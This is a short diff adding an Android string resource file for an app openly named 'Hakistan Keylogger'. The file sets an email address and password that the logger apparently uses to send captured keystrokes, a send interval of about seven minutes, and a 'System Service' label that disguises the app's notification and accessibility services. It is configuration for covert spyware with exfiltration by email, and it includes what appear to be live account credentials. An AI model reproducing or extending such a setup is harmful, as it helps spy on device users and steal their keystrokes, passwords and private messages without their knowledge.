@@ -1,0 +1,8 @@
+<resources>
+    <string name="app_name">Hakistan Keylogger</string>
+    <string name="EMail">dashdashpass7@gmail.com</string>
+    <string name="Password">createpassword.</string>
+    <string name="Interval">420000</string>
+    <string name="Notification_service_label">System Service</string>
+    <string name="Accessibility_service_label">...</string>
+</resources>
